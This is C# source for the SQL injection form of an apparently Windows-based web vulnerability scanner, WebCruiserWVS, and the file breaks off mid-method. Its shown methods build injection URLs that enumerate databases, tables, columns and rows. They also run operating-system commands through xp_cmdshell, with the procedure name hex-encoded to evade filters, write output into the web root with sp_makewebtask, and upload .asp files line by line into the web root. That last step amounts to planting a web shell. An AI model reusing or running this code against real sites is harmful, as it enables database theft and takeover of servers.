namespace WebCruiserWVS
{
    using System;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Drawing;
    using System.IO;
    using System.Net;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Text.RegularExpressions;
    using System.Threading;
    using System.Windows.Forms;
    using System.Xml;

    public class FormSQL : Form
    {
        private ToolStripButton btnCMD;
        private ToolStripButton btnDBCMD;
        private Button btnEncode;
        private ToolStripButton btnExpData;
        private ToolStripButton btnExpDB;
        private Button btnFileUpload;
        private ToolStripButton btnGetColumn;
        private ToolStripButton btnGetData;
        private ToolStripButton btnGetDB;
        private Button btnGetEnv;
        private ToolStripButton btnGetInfo;
        private ToolStripButton btnGetTable;
        private Button btnGetWebRoot;
        private ToolStripButton btnImpDB;
        private ToolStripButton btnReadFile;
        private Button btnSelectFile;
        private Button btnSetEnv;
        private ToolStripButton ButtonResetSQL;
        private ToolStripComboBox cmbChkAllDB;
        private ToolStripComboBox cmbDBTypeList;
        private ToolStripComboBox cmbInjectionType;
        private ColumnHeader columnHeader1;
        private ColumnHeader columnHeader2;
        private ComboBox ComboBoxDBEncoding;
        private ComboBox ComboBoxWebEncoding;
        private string CommentString = "";
        private IContainer components;
        private string CurrentDBName = "";
        private string ExistedTableInAccess = "";
        private bool GetBlindLocked;
        private GroupBox grpBlindType;
        private Label label1;
        private Label label10;
        private Label label11;
        private Label label12;
        private Label label13;
        private Label label14;
        private Label label15;
        private Label label16;
        private Label label17;
        private Label label18;
        private Label label19;
        private Label label2;
        private Label label20;
        private Label label21;
        private Label label22;
        private Label label3;
        private Label label4;
        private Label label5;
        private Label label6;
        private Label label7;
        private Label label8;
        private Label label9;
        private Label lblComment;
        private ListBox listBoxCMD;
        private ListView listViewData;
        private ListView listViewEnv;
        private string LogicOperator = "aNd";
        private FormMain mainfrm;
        private string PostFix = "";
        private string PreFix = "";
        private RadioButton radioBlind;
        private RadioButton radioCrossSite;
        private RadioButton radioFieldEcho;
        private RadioButton radioPlainText;
        private string Server = "";
        private SplitContainer splitDB;
        private TabPage tabCMD;
        private TabPage tabDatabase;
        private TabPage tabDebug;
        private TabPage tabEnv;
        private TabPage tabEscapeString;
        private TabPage tabFileReader;
        private TabPage tabFileUploader;
        private TabControl tabSQLInjection;
        private int TempTbNum;
        private ToolStrip toolFileReader;
        private ToolStrip toolStripCommand;
        private ToolStrip toolStripData;
        private ToolStrip toolStripDB;
        private ToolStrip toolStripDBCMD;
        private ToolStrip toolStripEnv;
        private ToolStripLabel toolStripLabel1;
        private ToolStripLabel toolStripLabel2;
        private ToolStripLabel toolStripLabel3;
        private ToolStripLabel toolStripLabel4;
        private ToolStripLabel toolStripLabel5;
        private ToolStripLabel toolStripLabel6;
        private ToolStripSeparator toolStripSeparator1;
        private ToolStripSeparator toolStripSeparator10;
        private ToolStripSeparator toolStripSeparator11;
        private ToolStripSeparator toolStripSeparator12;
        private ToolStripSeparator toolStripSeparator13;
        private ToolStripSeparator toolStripSeparator14;
        private ToolStripSeparator toolStripSeparator15;
        private ToolStripSeparator toolStripSeparator16;
        private ToolStripSeparator toolStripSeparator17;
        private ToolStripSeparator toolStripSeparator18;
        private ToolStripSeparator toolStripSeparator19;
        private ToolStripSeparator toolStripSeparator2;
        private ToolStripSeparator toolStripSeparator20;
        private ToolStripSeparator toolStripSeparator3;
        private ToolStripSeparator toolStripSeparator4;
        private ToolStripSeparator toolStripSeparator5;
        private ToolStripSeparator toolStripSeparator6;
        private ToolStripSeparator toolStripSeparator7;
        private ToolStripSeparator toolStripSeparator8;
        private ToolStripSeparator toolStripSeparator9;
        private ToolStrip toolStripSQL;
        private TreeView treeViewDB;
        private ToolStripTextBox txtCMD;
        private TextBox txtComment;
        private ToolStripTextBox txtDBCMD;
        private TextBox txtEscapeString;
        private TextBox txtFieldNum;
        private TextBox txtFileContent;
        private ToolStripTextBox txtFileName;
        private TextBox txtInjectField;
        private ToolStripTextBox txtKeyWord;
        private ToolStripTextBox txtRowsBegin;
        private ToolStripTextBox txtRowsEnd;
        private TextBox txtSourceString;
        private TextBox txtTargetFileName;
        private TextBox txtUploadFile;
        private TextBox txtWildField;
        private string URL = "";
        private ImageList WCRImageList;
        private string WildField = "1";

        public FormSQL(FormMain fm)
        {
            this.InitializeComponent();
            this.mainfrm = fm;
            this.cmbDBTypeList.SelectedIndex = 0;
            this.cmbInjectionType.SelectedIndex = 0;
            this.URL = this.mainfrm.URL;
            this.cmbChkAllDB.SelectedIndex = 0;
            this.toolStripEnv.Visible = true;
            this.toolStripDB.Visible = true;
            this.toolStripData.Visible = true;
        }

        private void AccessGetColumnDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { '^' });
                if (strArray.Length >= 3)
                {
                    string str = strArray[0];
                    string str2 = strArray[1];
                    string str3 = strArray[2];
                    string uRL = this.URL + this.PreFix + "%20" + this.LogicOperator + " (select count([" + str3 + "]) from [" + str2 + "])>=0" + this.PostFix;
                    string sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                    if (string.IsNullOrEmpty(sourceCode))
                    {
                        WebSite.LogScannedData("GET  " + uRL + "  NULL");
                    }
                    else if (sourceCode.IndexOf(this.mainfrm.CurrentSite.CurrentKeyWord) >= 0)
                    {
                        this.AddColumn2TreeView("0^" + str + "^" + str3);
                    }
                }
            }
            catch
            {
            }
        }

        private void AccessGetDataDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { '^' });
                string itemName = strArray[0];
                int num = int.Parse(strArray[1]);
                string str2 = strArray[2];
                string str3 = strArray[3];
                string str4 = strArray[4];
                string[] strArray2 = new string[] { "from (select top ", (num + 1).ToString(), " ", str2, " from ", str3, " order by ", str4, ") T order by ", str4, " desc" };
                string itemText = this.GetItemByAccess("select%20top%201%20", itemName, string.Concat(strArray2), 0xff, 0x400);
                this.AddItem2ListViewData(itemText);
            }
            catch
            {
            }
        }

        private void AccessGetTableDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string str = (string) data;
                string uRL = this.URL + this.PreFix + "%20" + this.LogicOperator + " (select count(1) from [" + str + "])>=0" + this.PostFix;
                string sourceCode = this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                if (string.IsNullOrEmpty(sourceCode))
                {
                    WebSite.LogScannedData("GET  " + uRL + "  NULL");
                }
                else if (sourceCode.IndexOf(this.mainfrm.CurrentSite.CurrentKeyWord) >= 0)
                {
                    this.AddTable2TreeView("0^" + str);
                    this.ExistedTableInAccess = str;
                }
            }
            catch
            {
            }
        }

        private void AddColumn2TreeView(string IndexAndNodeText)
        {
            if (!this.treeViewDB.InvokeRequired)
            {
                string[] strArray = IndexAndNodeText.Split(new char[] { '^' });
                int num = int.Parse(strArray[0]);
                int num2 = int.Parse(strArray[1]);
                string str = strArray[2];
                if (!string.IsNullOrEmpty(str))
                {
                    this.treeViewDB.Nodes[num].Nodes[num2].Nodes.Add(str).ImageKey = "column.png";
                    this.treeViewDB.ExpandAll();
                    this.treeViewDB.Refresh();
                }
            }
            else
            {
                dd method = new dd(this.AddColumn2TreeView);
                base.Invoke(method, new object[] { IndexAndNodeText });
            }
        }

        private void AddDB2TreeView(string NodeText)
        {
            if (!string.IsNullOrEmpty(NodeText))
            {
                if (!this.treeViewDB.InvokeRequired)
                {
                    this.treeViewDB.Nodes.Add(NodeText).ImageKey = "db.png";
                    this.treeViewDB.ExpandAll();
                    this.treeViewDB.Refresh();
                }
                else
                {
                    dd method = new dd(this.AddDB2TreeView);
                    base.Invoke(method, new object[] { NodeText });
                }
            }
        }

        private void AddItem2listBoxCMD(string ItemText)
        {
            if (!this.listBoxCMD.InvokeRequired)
            {
                this.listBoxCMD.Items.Add(ItemText);
                this.listBoxCMD.Refresh();
            }
            else
            {
                dd method = new dd(this.AddItem2listBoxCMD);
                base.Invoke(method, new object[] { ItemText });
            }
        }

        private void AddItem2ListViewData(string ItemText)
        {
            if (!this.listViewData.InvokeRequired)
            {
                string[] strArray = ItemText.Split(new char[] { '^' });
                ListViewItem item = this.listViewData.Items.Add(strArray[0]);
                try
                {
                    for (int i = 1; i < this.listViewData.Columns.Count; i++)
                    {
                        item.SubItems.Add(strArray[i]);
                    }
                    this.listViewData.Refresh();
                }
                catch
                {
                }
            }
            else
            {
                dd method = new dd(this.AddItem2ListViewData);
                base.Invoke(method, new object[] { ItemText });
            }
        }

        private void AddItem2ListViewInfo(string ItemText)
        {
            if (!this.listViewEnv.InvokeRequired)
            {
                this.listViewEnv.Items.Add(ItemText);
                this.listViewEnv.Refresh();
            }
            else
            {
                dd method = new dd(this.AddItem2ListViewInfo);
                base.Invoke(method, new object[] { ItemText });
            }
        }

        private void AddSubItem2ListViewInfo(string IndexItemText)
        {
            if (!this.listViewEnv.InvokeRequired)
            {
                string[] strArray = IndexItemText.Split(new char[] { '^' });
                int num = int.Parse(strArray[0]);
                string text = strArray[1];
                if (this.listViewEnv.Items[num].SubItems.Count > 1)
                {
                    this.listViewEnv.Items[num].SubItems.RemoveAt(1);
                }
                this.listViewEnv.Items[num].SubItems.Add(text);
                this.listViewEnv.Refresh();
            }
            else
            {
                dd method = new dd(this.AddSubItem2ListViewInfo);
                base.Invoke(method, new object[] { IndexItemText });
            }
        }

        private void AddTable2TreeView(string IndexAndNodeText)
        {
            int num = int.Parse(IndexAndNodeText.Split(new char[] { '^' })[0]);
            string str = IndexAndNodeText.Split(new char[] { '^' })[1];
            if (!string.IsNullOrEmpty(str))
            {
                if (!this.treeViewDB.InvokeRequired)
                {
                    this.treeViewDB.Nodes[num].Nodes.Add(str).ImageKey = "table.png";
                    this.treeViewDB.ExpandAll();
                    this.treeViewDB.Refresh();
                }
                else
                {
                    dd method = new dd(this.AddTable2TreeView);
                    base.Invoke(method, new object[] { IndexAndNodeText });
                }
            }
        }

        private void AddTabPagesByName(TabPage TabName)
        {
            if (!this.tabSQLInjection.InvokeRequired)
            {
                if (!this.tabSQLInjection.TabPages.Contains(TabName))
                {
                    TabPage[] pages = new TabPage[] { TabName };
                    this.tabSQLInjection.TabPages.AddRange(pages);
                }
            }
            else
            {
                AddTab method = new AddTab(this.AddTabPagesByName);
                base.Invoke(method, new object[] { TabName });
            }
        }

        private void btnCMD_Click(object sender, EventArgs e)
        {
            this.mainfrm.DisplayProgress("Executing Command ...");
            string text = this.txtCMD.Text;
            if (!string.IsNullOrEmpty(text))
            {
                this.listBoxCMD.Items.Clear();
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.UnKnown)
                {
                    this.mainfrm.CurrentSite.DatabaseType = this.GetDBType(this.URL);
                }
                if (this.mainfrm.CurrentSite.InjType == InjectionType.UnKnown)
                {
                    this.mainfrm.CurrentSite.InjType = this.GetInjectionType();
                }
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.UnKnown)
                {
                    this.GetBlindType(this.URL);
                }
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
                {
                    int RowNum;
                    string str2 = this.EscapeSingleQuotes(text);
                    this.TempTbNum++;
                    string TempTableName = "WCRTEMP" + string.Format("{0:D5}", this.TempTbNum);
                    string FullURL = this.URL + this.PreFix + ";create table " + TempTableName + "(tmp nvarchar(4000))%3B%2D%2D";
                    this.mainfrm.CurrentSite.GetSourceCode(FullURL, this.mainfrm.ReqType);
                    FullURL = this.URL + this.PreFix + ";declare @a nvarchar(4000);set @a=" + str2 + ";insert into " + TempTableName + "(tmp) exec master.dbo.xp_cmdshell @a;alter table " + TempTableName + " add id int not null identity (1,1)%2D%2D";
                    this.mainfrm.CurrentSite.GetSourceCode(FullURL, this.mainfrm.ReqType);
                    try
                    {
                        RowNum = int.Parse(this.GetItemBySQLServer("select", "convert(varchar(10),count(1))", "from " + TempTableName, 0x7e, 0x400, false));
                    }
                    catch
                    {
                        MessageBox.Show("Get CMD Result Row Number Error!");
                        RowNum = 0;
                    }
                    Thread GetCMDRow = new Thread(new ParameterizedThreadStart(delegate {
                        for (int j = 0; j < RowNum; j++)
                        {
                            int num2 = j + 1;
                            string itemText = this.GetItemBySQLServer("select%20top%201", "isnull(tmp,char(32))", "from " + TempTableName + " where id=" + num2.ToString(), 0xff, 0xff, false).Replace("&lt;", "<").Replace("&gt;", ">");
                            this.AddItem2listBoxCMD(itemText);
                        }
                    }));
                    Thread thread = new Thread(new ParameterizedThreadStart(delegate {
                        GetCMDRow.Join();
                        FullURL = this.URL + this.PreFix + ";drop table " + TempTableName + "%3B%2D%2D";
                        this.mainfrm.CurrentSite.GetSourceCode(FullURL, this.mainfrm.ReqType);
                        this.mainfrm.DisplayProgress("Done");
                    }));
                    GetCMDRow.Start();
                    thread.Start();
                }
                else
                {
                    MessageBox.Show("Sorry, It Suppot SQL Server Only!", "Information");
                    this.mainfrm.DisplayProgress("Done");
                }
            }
        }

        private void btnDBCMD_Click(object sender, EventArgs e)
        {
            this.mainfrm.DisplayProgress("Executing DB Command ...");
            string text = this.txtDBCMD.Text;
            if (!string.IsNullOrEmpty(text))
            {
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.UnKnown)
                {
                    this.mainfrm.CurrentSite.DatabaseType = this.GetDBType(this.URL);
                }
                if (this.mainfrm.CurrentSite.InjType == InjectionType.UnKnown)
                {
                    this.mainfrm.CurrentSite.InjType = this.GetInjectionType();
                }
                if (this.mainfrm.CurrentSite.InjType == InjectionType.NotInjectable)
                {
                    this.mainfrm.DisplayProgress("Done");
                }
                else
                {
                    if (this.mainfrm.CurrentSite.BlindInjType == BlindType.UnKnown)
                    {
                        this.GetBlindType(this.URL);
                    }
                    if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
                    {
                        if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.WebRoot))
                        {
                            this.mainfrm.CurrentSite.WebRoot = this.GetIISWebRoot(this.URL);
                        }
                        string uRL = this.URL + this.PreFix + ";exec master..sp_makewebtask @outputfile=" + this.EscapeSingleQuotes(this.mainfrm.CurrentSite.WebRoot + @"\WebCR.htm") + ",@query=%27" + text + "%27%2D%2D";
                        this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                        if (DateTime.Now.Subtract(this.mainfrm.CurrentSite.LastModifiedTime).Seconds < 30)
                        {
                            this.mainfrm.SelectTool("WebBrowser");
                            this.mainfrm.NavigatePage(this.mainfrm.CurrentSite.HTTPRoot + "WebCR.htm", RequestType.GET, "");
                        }
                        else
                        {
                            MessageBox.Show("Execute DB SQL Failed!", "Information");
                        }
                    }
                    this.mainfrm.DisplayProgress("Done");
                }
            }
        }

        private void btnEncode_Click(object sender, EventArgs e)
        {
            if (this.mainfrm.CurrentSite.DatabaseType == DBType.UnKnown)
            {
                MessageBox.Show("Please Select the DataBase Type!", "Notice", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            else
            {
                string text = this.txtSourceString.Text;
                if (string.IsNullOrEmpty(text))
                {
                    MessageBox.Show("Please input the source string!", "Notice", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                }
                else
                {
                    string str2 = this.EscapeSingleQuotes(text);
                    this.txtEscapeString.Text = str2;
                }
            }
        }

        private void btnExpData_Click(object sender, EventArgs e)
        {
            if (this.listViewData.Items.Count != 0)
            {
                string state = this.mainfrm.CurrentSite.DomainHost + "_Data.xls";
                SaveFileDialog dialog = new SaveFileDialog {
                    Filter = "XLS File(*.xls) | *.xls",
                    InitialDirectory = Application.StartupPath,
                    FileName = state
                };
                if (dialog.ShowDialog() == DialogResult.OK)
                {
                    state = dialog.FileName;
                    this.mainfrm.DisplayProgress("Exporting Data...");
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExportListViewData), state);
                }
            }
        }

        private void btnExpDB_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.treeViewDB.Nodes.Count >= 1)
                {
                    string filename = this.mainfrm.CurrentSite.DomainHost + "_DB.xml";
                    SaveFileDialog dialog = new SaveFileDialog {
                        Filter = "XML File(*.xml) | *.xml",
                        InitialDirectory = Application.StartupPath,
                        FileName = filename
                    };
                    if (dialog.ShowDialog() == DialogResult.OK)
                    {
                        filename = dialog.FileName;
                        dialog.Dispose();
                        this.GetXmlDocumentFromDBTree().Save(filename);
                        MessageBox.Show("* Export OK!\r\n* FileName: " + filename, "Done");
                    }
                }
            }
            catch (Exception exception)
            {
                MessageBox.Show(exception.Message);
            }
        }

        private void btnFileUpload_Click(object sender, EventArgs e)
        {
            string str = this.txtUploadFile.Text.Trim();
            string str2 = this.txtTargetFileName.Text.Trim();
            if (!string.IsNullOrEmpty(str) && !string.IsNullOrEmpty(str2))
            {
                StreamReader reader = new StreamReader(str);
                string str3 = "";
                string uRL = "";
                int num = 1;
                string itemName = "echo.>" + str2;
                this.InitURL();
                uRL = this.URL + this.PreFix + ";declare @e sysname,@c sysname;set @e=0x6D00610073007400650072002E002E00780070005F0063006D0064007300680065006C006C00;set @c=" + this.EscapeSingleQuotes(itemName) + ";exec @e @c;--";
                this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                while ((str3 = reader.ReadLine()) != null)
                {
                    str3 = str3.Replace("^", "^^").Replace("<", "^<").Replace(">", "^>").Replace("|", "^|").Replace("&", "^&").Replace("\"", "^\"").Replace("'", "^'").Trim();
                    if (!string.IsNullOrEmpty(str3))
                    {
                        itemName = "echo " + str3 + ">>" + str2;
                        uRL = this.URL + this.PreFix + ";declare @e sysname,@c sysname;set @e=0x6D00610073007400650072002E002E00780070005F0063006D0064007300680065006C006C00;set @c=" + this.EscapeSingleQuotes(itemName) + ";exec @e @c;--";
                        this.mainfrm.CurrentSite.GetSourceCode(uRL, this.mainfrm.ReqType);
                        this.mainfrm.DisplayProgress("Uploading Row: " + num.ToString());
                        num++;
                    }
                }
                this.mainfrm.DisplayProgress("Done");
                MessageBox.Show("Upload Complete!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
        }

        private void btnGetColumn_Click(object sender, EventArgs e)
        {
            this.InitURL();
            if (this.mainfrm.CurrentSite.DatabaseType == DBType.UnKnown)
            {
                this.mainfrm.CurrentSite.DatabaseType = this.GetDBType(this.URL);
            }
            if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecSQLServerGetColumn));
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.MySQL)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecMySQLGetColumn));
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecOracleGetColumn));
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecDB2GetColumn));
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Access)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecAccessGetColumn));
            }
            this.btnGetColumn.Enabled = false;
        }

        private void btnGetData_Click(object sender, EventArgs e)
        {
            if (this.listViewData.Columns.Count == 0)
            {
                MessageBox.Show("Please Check the column name!");
            }
            else
            {
                int num;
                int num2;
                this.listViewData.Items.Clear();
                this.InitURL();
                try
                {
                    num = int.Parse(this.txtRowsBegin.Text);
                    num2 = int.Parse(this.txtRowsEnd.Text);
                    if ((num < 1) || (num2 < 1))
                    {
                        throw new Exception("");
                    }
                    if (num > num2)
                    {
                        int num3 = num2;
                        num2 = num;
                        num = num3;
                    }
                }
                catch
                {
                    MessageBox.Show("Please Input Interger Number >=1  !");
                    return;
                }
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.UnKnown)
                {
                    this.mainfrm.CurrentSite.DatabaseType = this.GetDBType(this.URL);
                }
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
                {
                    this.ExecSQLServerGetData(num, num2);
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.MySQL)
                {
                    this.ExecMySQLGetData(num, num2);
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle)
                {
                    this.ExecOracleGetData(num, num2);
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
                {
                    this.ExecDB2GetData(num, num2);
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Access)
                {
                    this.ExecAccessGetData(num, num2);
                }
            }
        }

        private void btnGetDB_Click(object sender, EventArgs e)
        {
            this.InitURL();
            if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
            {
                this.mainfrm.CurrentSite.CurrentKeyWord = this.GetKeyWord(this.URL);
            }
            if (this.mainfrm.CurrentSite.InjType == InjectionType.UnKnown)
            {
                this.mainfrm.CurrentSite.InjType = this.GetInjectionType();
            }
            if (this.mainfrm.CurrentSite.InjType == InjectionType.NotInjectable)
            {
                MessageBox.Show("Current URL is not injectable !");
            }
            else
            {
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.UnKnown)
                {
                    this.mainfrm.CurrentSite.DatabaseType = this.GetDBType(this.URL);
                    if (this.mainfrm.CurrentSite.DatabaseType == DBType.UnKnown)
                    {
                        return;
                    }
                }
                this.treeViewDB.Nodes.Clear();
                if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
                {
                    this.ExecSQLServerGetDB();
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.MySQL)
                {
                    this.ExecMySQLGetDB();
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle)
                {
                    this.ExecOracleGetDB();
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
                {
                    this.ExecDB2GetDB();
                }
                else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Access)
                {
                    this.AddDB2TreeView("Access");
                    this.mainfrm.DisplayProgress("Done");
                }
            }
        }

        private void btnGetEnv_Click(object sender, EventArgs e)
        {
            if (this.mainfrm.CurrentSite.BlindInjType == BlindType.PlainText)
            {
                this.radioPlainText.Checked = true;
            }
            else if (this.mainfrm.CurrentSite.BlindInjType == BlindType.FieldEcho)
            {
                this.radioFieldEcho.Checked = true;
            }
            else if (this.mainfrm.CurrentSite.BlindInjType == BlindType.Blind)
            {
                this.radioBlind.Checked = true;
            }
            else if (this.mainfrm.CurrentSite.BlindInjType == BlindType.CrossSite)
            {
                this.radioCrossSite.Checked = true;
            }
            else
            {
                this.radioPlainText.Checked = false;
                this.radioFieldEcho.Checked = false;
                this.radioBlind.Checked = false;
                this.radioCrossSite.Checked = false;
            }
            this.txtInjectField.Text = this.mainfrm.CurrentSite.CurrentFieldEchoIndex.ToString();
            this.txtFieldNum.Text = this.mainfrm.CurrentSite.CurrentFieldNum.ToString();
            this.txtWildField.Text = this.WildField;
            this.btnSetEnv.Enabled = true;
            this.txtComment.Text = this.CommentString;
            this.ComboBoxWebEncoding.Text = this.mainfrm.CurrentSite.WebEncoding.BodyName;
            this.ComboBoxDBEncoding.Text = this.mainfrm.CurrentSite.DBEncoding.BodyName;
        }

        private void btnGetInfo_Click(object sender, EventArgs e)
        {
            if (this.GetBlindLocked)
            {
                MessageBox.Show("Please wait a moment till the task: Get Field Number and location finished!", "Information");
            }
            else if (WebSite.CurrentStatus == TaskStatus.Stop)
            {
                MessageBox.Show("Please wait a moment till the task: Terminating Threads Finished!", "Information");
            }
            else
            {
                this.InitURL();
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.GetEnvInfo));
            }
        }

        private void btnGetTable_Click(object sender, EventArgs e)
        {
            this.InitURL();
            if (this.mainfrm.CurrentSite.DatabaseType == DBType.UnKnown)
            {
                this.mainfrm.CurrentSite.DatabaseType = this.GetDBType(this.URL);
            }
            if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecSQLServerGetTable));
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.MySQL)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecMySQLGetTable));
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecOracleGetTable));
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.DB2)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecDB2GetTable));
            }
            else if (this.mainfrm.CurrentSite.DatabaseType == DBType.Access)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.ExecAccessGetTable));
            }
            this.btnGetTable.Enabled = false;
        }

        private void btnGetWebRoot_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.WebRoot))
            {
                string iISWebRoot = this.GetIISWebRoot(this.URL);
                if (string.IsNullOrEmpty(iISWebRoot))
                {
                    MessageBox.Show("Get Web Root Failed!", "Notice");
                    return;
                }
                this.mainfrm.CurrentSite.WebRoot = iISWebRoot;
            }
            this.txtTargetFileName.Text = this.mainfrm.CurrentSite.WebRoot + @"\";
        }

        private void btnImpDB_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.treeViewDB.Nodes.Count > 0)
                {
                    if (MessageBox.Show("* Import Database Will Clear Current Database Information.\r\n* Continue?\r\n", "Confirm", MessageBoxButtons.OKCancel, MessageBoxIcon.Asterisk) == DialogResult.Cancel)
                    {
                        return;
                    }
                    this.treeViewDB.Nodes.Clear();
                }
                OpenFileDialog dialog = new OpenFileDialog {
                    Filter = "XML File(*.xml)|*.xml",
                    InitialDirectory = Application.StartupPath
                };
                dialog.ShowDialog();
                string fileName = dialog.FileName;
                dialog.Dispose();
                if (!string.IsNullOrEmpty(fileName))
                {
                    XmlDocument wcrXml = new XmlDocument();
                    wcrXml.Load(fileName);
                    this.LoadFromXmlDocument(wcrXml);
                }
            }
            catch (Exception exception)
            {
                MessageBox.Show(exception.Message);
            }
        }

        private void btnReadFile_Click(object sender, EventArgs e)
        {
            if (this.mainfrm.CurrentSite.DatabaseType == DBType.MySQL)
            {
                string state = this.txtFileName.Text.Trim();
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.MySQLReadFile), state);
            }
        }

        private void btnSelectFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog {
                Filter = "ASP File(*.asp)|*.asp|Text File(*.txt)|*.txt|All File(*.*)|*.*",
                InitialDirectory = Application.StartupPath
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                this.txtUploadFile.Text = dialog.FileName;
                if (!string.IsNullOrEmpty(this.mainfrm.CurrentSite.WebRoot))
                {
                    this.txtTargetFileName.Text = this.mainfrm.CurrentSite.WebRoot + @"\1.asp";
                }
            }
        }

        private void btnSetEnv_Click(object sender, EventArgs e)
        {
            if (this.radioPlainText.Checked)
            {
                this.mainfrm.CurrentSite.BlindInjType = BlindType.PlainText;
            }
            else if (this.radioFieldEcho.Checked)
            {
                this.mainfrm.CurrentSite.BlindInjType = BlindType.FieldEcho;
            }
            else if (this.radioBlind.Checked)
            {
                this.mainfrm.CurrentSite.BlindInjType = BlindType.Blind;
            }
            else if (this.radioCrossSite.Checked)
            {
                this.mainfrm.CurrentSite.BlindInjType = BlindType.CrossSite;
            }
            try
            {
                if (!string.IsNullOrEmpty(this.txtInjectField.Text))
                {
                    this.mainfrm.CurrentSite.CurrentFieldEchoIndex = int.Parse(this.txtInjectField.Text);
                }
                if (!string.IsNullOrEmpty(this.txtFieldNum.Text))
                {
                    this.mainfrm.CurrentSite.CurrentFieldNum = int.Parse(this.txtFieldNum.Text);
                }
                if (!string.IsNullOrEmpty(this.txtWildField.Text))
                {
                    this.WildField = this.txtWildField.Text;
                }
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.FieldEcho)
                {
                    if (this.mainfrm.CurrentSite.CurrentFieldEchoIndex > this.mainfrm.CurrentSite.CurrentFieldNum)
                    {
                        MessageBox.Show("Please Check the Input: " + this.mainfrm.CurrentSite.CurrentFieldEchoIndex.ToString() + " is larger than " + this.mainfrm.CurrentSite.CurrentFieldNum.ToString());
                    }
                    if (this.mainfrm.CurrentSite.CurrentFieldEchoIndex < 1)
                    {
                        MessageBox.Show("The Number should >=1 .");
                    }
                    if (this.mainfrm.CurrentSite.CurrentFieldNum < 1)
                    {
                        MessageBox.Show("The Number should >=1 .");
                    }
                }
                this.btnSetEnv.Enabled = false;
                string text = this.txtComment.Text;
                if (!string.IsNullOrEmpty(text))
                {
                    this.CommentString = text;
                }
                this.mainfrm.CurrentSite.WebEncoding = Encoding.GetEncoding(this.ComboBoxWebEncoding.Text);
                this.mainfrm.CurrentSite.DBEncoding = Encoding.GetEncoding(this.ComboBoxDBEncoding.Text);
                MessageBox.Show("The Type of Getting Data Has Been Set To " + this.mainfrm.CurrentSite.BlindInjType.ToString() + "\r\nComments: " + this.CommentString + "\r\nWeb Encoding: " + this.mainfrm.CurrentSite.WebEncoding.BodyName + "\r\nDatabase Encoding: " + this.mainfrm.CurrentSite.DBEncoding.BodyName, "Done! ", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            catch (Exception exception)
            {
                MessageBox.Show("Please Check the Input!\r\n" + exception.Message, "Notice");
            }
        }

        private void ButtonResetSQL_Click(object sender, EventArgs e)
        {
            this.mainfrm.CurrentSite.DatabaseType = DBType.UnKnown;
            this.UpdateComboDBType("UnKnown");
